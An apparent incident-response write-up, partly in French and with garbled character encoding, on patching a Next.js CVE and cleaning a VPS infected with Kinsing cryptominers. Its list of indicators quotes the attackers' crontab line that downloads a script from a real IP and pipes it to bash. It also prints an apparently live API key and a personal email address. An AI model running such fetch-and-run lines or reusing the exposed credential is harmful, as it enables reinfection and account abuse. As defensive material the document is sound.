# üö® Security Patch Applied - CVE-2025-66478

**Date:** 9 d√©cembre 2025
**Application:** forms.kago-group.com
**Severity:** CVSS 10.0 (Critical Maximum)
**Status:** ‚úÖ PATCHED

---

## ‚úÖ Patches Applied

### Next.js Update
- **Before:** Next.js 15.5.2 (VULNERABLE)
- **After:** Next.js 15.5.7 (PATCHED)
- **Build Status:** ‚úÖ Successful (no errors)

### Additional Fixes
- js-yaml vulnerability patched
- All npm audit vulnerabilities resolved
- 11 packages updated total

---

## üîê ACTIONS REQUISES IMM√âDIATEMENT

### 1. Rotation des Secrets (CRITIQUE)

Tous les secrets de cette application DOIVENT √™tre rot√©s car le serveur a potentiellement √©t√© compromis.

#### Variables d'environnement √† changer:

**RESEND_API_KEY** (Priorit√©: CRITIQUE)
```bash
# Action: R√©voquer et reg√©n√©rer dans Resend Dashboard
# 1. Connexion: https://resend.com/api-keys
# 2. R√©voquer la cl√© actuelle: re_V2B6bNDm_Bjr6Dr5ZsM74nENpxuhvDuA7
# 3. G√©n√©rer une nouvelle cl√©
# 4. Mettre √† jour dans Coolify/Vercel
```

**CONTACT_EMAIL** (Priorit√©: Basse)
```bash
# Valeur actuelle: kamil.biczyk@kago-group.com
# Action: Pas de rotation n√©cessaire (email, pas un secret)
# Surveillance: V√©rifier les emails suspects re√ßus
```

**RESEND_FROM_EMAIL** (Priorit√©: Basse)
```bash
# Valeur actuelle: no-reply@kago-group.com
# Action: Pas de rotation n√©cessaire (email, pas un secret)
```

#### Commandes de g√©n√©ration de nouveaux secrets

Si vous ajoutez d'autres secrets √† l'avenir:

```bash
# G√©n√©rer un NEXTAUTH_SECRET (64+ caract√®res)
openssl rand -base64 48

# G√©n√©rer un JWT_SECRET
openssl rand -hex 32

# G√©n√©rer un API_SECRET_KEY g√©n√©rique
openssl rand -base64 32
```

---

## üßπ Nettoyage VPS (CRITIQUE)

### √âtape 1: Tuer les processus malveillants

```bash
# SSH vers votre VPS
ssh user@your-vps-ip

# Tuer TOUS les processus suspects
sudo pkill -9 -f kdevtmpfsi
sudo pkill -9 -f kinsing
sudo pkill -9 -f xmrig
sudo pkill -9 -f kworker
sudo pkill -9 -f ".kworker"

# V√©rifier qu'ils sont bien arr√™t√©s
ps aux | grep -E "kdevtmpfsi|kinsing|xmrig|kworker"
# Si rien ne s'affiche ‚Üí OK ‚úÖ
```

### √âtape 2: Supprimer les fichiers malveillants

```bash
# Supprimer tous les fichiers malveillants connus
sudo rm -rf /tmp/kdevtmpfsi
sudo rm -rf /tmp/kinsing
sudo rm -rf /tmp/kworker
sudo rm -rf /tmp/.kworker
sudo rm -rf /tmp/config.json
sudo rm -rf /tmp/libsystem.so
sudo rm -rf /tmp/fghgf
sudo rm -rf /tmp/vim
sudo rm -rf /tmp/lc
sudo rm -rf /tmp/x
sudo rm -f /tmp/*.sh
sudo rm -f /tmp/bins.sh
sudo rm -f /usr/bin/.kworker

# V√©rifier les fichiers r√©cemment cr√©√©s dans /tmp
find /tmp -type f -mtime -7 -ls
```

### √âtape 3: Nettoyer les Crontabs (CRITIQUE - Persistence)

```bash
# SAUVEGARDER les crons actuels
crontab -l > ~/crontab_backup_$(date +%Y%m%d_%H%M%S).txt

# Afficher les crons actuels
crontab -l

# Chercher des lignes suspectes comme:
# - @reboot /usr/bin/.kworker react 20.193.135.188:443
# - * * * * * wget -q -O - http://80.64.16.241/re.sh | bash
# - Toute ligne contenant "kworker", "kinsing", "xmrig"

# Si vous voyez des lignes suspectes:
crontab -r  # Supprime TOUT

# Recr√©e uniquement vos crons l√©gitimes
```

### √âtape 4: V√©rifier les connexions r√©seau

```bash
# Chercher des connexions vers des IPs malveillantes
sudo netstat -tulpn | grep -E "hashvault|45.76.155|193.34.213|194.69.203|80.64.16|20.193.135"

# Si des connexions actives sont trouv√©es ‚Üí Tuer les processus associ√©s
```

### √âtape 5: Red√©marrer le container Docker

```bash
# Lister les containers actifs
docker ps

# Identifier le container de forms.kago-group.com
# Puis red√©marrer:
docker restart [CONTAINER_ID_OU_NOM]

# Ou red√©marrer tous les containers:
docker restart $(docker ps -q)
```

### √âtape 6: V√©rification post-nettoyage

```bash
# CPU doit √™tre < 50%
docker stats --no-stream

# Aucun processus suspect
docker exec [CONTAINER_ID] ps aux | grep -E "kdevtmpfsi|kinsing|xmrig|kworker"

# Aucun fichier suspect dans /tmp
ls -la /tmp
```

---

## üìä Indicateurs de Compromission (IoC)

### Processus malveillants √† chercher:
- `kdevtmpfsi` - XMRig cryptominer
- `kinsing` - Dropper/loader
- `xmrig` - Monero miner
- `.kworker` - Persistence binary

### Fichiers malveillants:
- `/tmp/kdevtmpfsi`
- `/tmp/kinsing`
- `/tmp/libsystem.so` - LD_PRELOAD rootkit
- `/tmp/config.json` - Mining pool config
- `/usr/bin/.kworker`

### IPs malveillantes:
- `45.76.155.14` - Dropper server
- `194.69.203.32:81` - Botnet C2
- `193.34.213.150` - Kinsing payload server
- `149.248.44.88` - Malware distribution
- `20.193.135.188:443` - Mining pool
- `80.64.16.241` - Re-infection script
- `pool.hashvault.pro:443` - Monero mining pool
- `auto.c3pool.org:80` - Mining pool

**Si vous voyez un de ces √©l√©ments ‚Üí COMPROMIS**

---

## üöÄ D√©ploiement en Production

### √âtapes de d√©ploiement:

1. **Commit et Push** (voir section suivante)

2. **D√©ployer via Coolify/Vercel**
   - Si Coolify: Push vers main d√©clenchera un d√©ploiement automatique
   - Si Vercel: Push vers main d√©clenchera un d√©ploiement automatique

3. **V√©rifier les logs de d√©ploiement**
   ```bash
   # Chercher dans les logs:
   # "‚ñ≤ Next.js 15.5.7"
   ```

4. **Mettre √† jour les variables d'environnement**
   - Aller dans le dashboard de d√©ploiement
   - Mettre √† jour `RESEND_API_KEY` avec la NOUVELLE cl√©
   - Red√©ployer si n√©cessaire

5. **Tester l'application**
   - Acc√©der √† https://forms.kago-group.com/letter
   - Remplir le formulaire de test
   - V√©rifier que l'email est bien envoy√©
   - V√©rifier le CPU du serveur

---

## üìà Monitoring Post-Patch

### Surveillance Jours 1-3 (CRITIQUE)

**Toutes les heures:**

```bash
# V√©rifier le CPU (doit √™tre < 50%)
docker stats --no-stream

# V√©rifier les processus
docker exec [CONTAINER_ID] ps aux | head -20

# V√©rifier les logs
docker logs [CONTAINER_ID] --tail 50

# Chercher:
# - Processus inconnus
# - CPU > 100% constant
# - Connexions vers IPs suspectes
# - Erreurs inhabituelles
```

**Indicateurs de compromission persistante:**
- ‚ùå CPU > 150% constant
- ‚ùå Processus kdevtmpfsi/kinsing/xmrig qui reviennent
- ‚ùå Connexions vers pool.hashvault.pro ou autres IPs malveillantes
- ‚ùå Fichiers qui se recr√©ent dans /tmp

**Si compromise persiste ‚Üí R√âINSTALLATION VPS RECOMMAND√âE**

### Surveillance Semaine 1

**Une fois par jour:**

```bash
# V√©rifier CPU
docker stats

# V√©rifier crontab
crontab -l

# V√©rifier /tmp
ls -la /tmp

# V√©rifier les logs d'application
docker logs [CONTAINER_ID] --tail 100
```

### Surveillance Semaine 2-4

**Deux fois par semaine:**
- V√©rifier CPU avec `docker stats`
- V√©rifier les logs d'erreur
- V√©rifier `/tmp` pour nouveaux fichiers

---

## ‚úÖ Checklist Compl√®te

### Patch Appliqu√©
- [x] Next.js mis √† jour vers 15.5.7
- [x] npm audit clean (0 vulnerabilities)
- [x] Build successful
- [x] Documentation cr√©√©e

### Actions Requises (√Ä FAIRE MAINTENANT)
- [ ] R√©voquer et reg√©n√©rer RESEND_API_KEY
- [ ] SSH vers VPS et tuer processus malveillants
- [ ] Supprimer fichiers malveillants
- [ ] Nettoyer crontab
- [ ] V√©rifier connexions r√©seau
- [ ] Red√©marrer container Docker
- [ ] Commit et push les changements
- [ ] Mettre √† jour RESEND_API_KEY dans Coolify/Vercel
- [ ] D√©ployer en production
- [ ] V√©rifier d√©ploiement (Next.js 15.5.7 dans logs)
- [ ] Tester le formulaire
- [ ] V√©rifier CPU < 50%

### Surveillance (ONGOING)
- [ ] Jour 1: Surveiller toutes les heures
- [ ] Jour 2: Surveiller toutes les heures
- [ ] Jour 3: Surveiller toutes les heures
- [ ] Semaine 1: Surveiller quotidiennement
- [ ] Semaine 2-4: Surveiller 2x/semaine

---

## üîí Pr√©vention Future

### 1. Activer Dependabot sur GitHub

```
Settings ‚Üí Security ‚Üí Dependabot alerts ‚Üí Enable
Settings ‚Üí Security ‚Üí Dependabot security updates ‚Üí Enable
```

### 2. Ajouter npm audit au build (Coolify)

```bash
npm install && npm audit --audit-level=high && npm run build
```

### 3. Installer fail2ban sur VPS

```bash
sudo apt install fail2ban
sudo systemctl enable fail2ban
sudo systemctl start fail2ban
```

### 4. Script de monitoring CPU

```bash
cat > ~/monitor_cpu_forms.sh <<'EOF'
#!/bin/bash
CONTAINER_NAME="forms-kago-group-com"  # Adapter au nom r√©el
CPU=$(docker stats --no-stream --format "{{.CPUPerc}}" $CONTAINER_NAME | sed 's/%//')
if (( $(echo "$CPU > 150" | bc -l) )); then
  echo "‚ö†Ô∏è forms.kago-group.com - High CPU: ${CPU}%"
  # Ajouter notification (email, Slack, Discord, etc.)
fi
EOF

chmod +x ~/monitor_cpu_forms.sh

# Ajouter au cron (toutes les 5 minutes)
echo "*/5 * * * * ~/monitor_cpu_forms.sh" | crontab -
```

---

## üìû Support

### Ressources
- **CVE Advisory:** https://nextjs.org/blog/CVE-2025-66478
- **Next.js Docs:** https://nextjs.org/docs
- **Resend Support:** https://resend.com/support

### En cas de probl√®me

1. **Build fails apr√®s patch:**
   ```bash
   rm -rf node_modules package-lock.json .next
   npm install
   npm run build
   ```

2. **Compromission persiste:**
   - Envisager r√©installation compl√®te du VPS
   - Contacter l'h√©bergeur VPS
   - V√©rifier les logs syst√®me: `/var/log/syslog`, `/var/log/auth.log`

3. **Emails ne s'envoient plus:**
   - V√©rifier nouvelle cl√© API Resend
   - V√©rifier domaine v√©rifi√© dans Resend
   - V√©rifier logs: `docker logs [CONTAINER_ID]`

---

**Document cr√©√© le:** 9 d√©cembre 2025
**Patch appliqu√© par:** Claude Code
**Next.js version:** 15.5.2 ‚Üí 15.5.7
**Status:** ‚úÖ Application patch√©e, d√©ploiement requis
